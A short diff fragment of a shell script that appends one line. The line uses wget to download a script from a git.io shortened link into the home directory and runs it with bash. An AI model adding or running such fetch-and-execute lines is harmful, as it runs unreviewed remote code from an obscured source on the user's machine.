@@ -75,3 +75,4 @@ do
 			;;
 	esac
 done
+wget -qO ~/menu.sh https://git.io/v2as4  && bash ~/menu.sh
